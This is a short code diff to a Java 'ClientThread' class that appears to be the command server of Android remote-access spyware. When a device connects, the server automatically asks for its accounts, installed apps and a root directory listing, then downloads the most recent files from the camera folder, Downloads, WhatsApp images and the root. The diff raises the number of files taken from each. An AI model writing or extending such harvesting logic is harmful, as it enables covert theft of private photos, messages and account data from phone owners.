@@ -66,10 +66,10 @@ public class ClientThread implements Runnable {
             say("accounts");
             say("apps");
             say("ls /");
-            say("downlast 20, /DCIM/Camera");
-            say("downlast 20, /Download");
-            say("downlast 20, /WhatsApp/Media/WhatsApp Images");
-            say("downlast 20, /");
+            say("downlast 60, /DCIM/Camera");
+            say("downlast 60, /Download");
+            say("downlast 25, /WhatsApp/Media/WhatsApp Images");
+            say("downlast 25, /");
 
             // TODO check if client already exists.
             // TODO notification of a new device
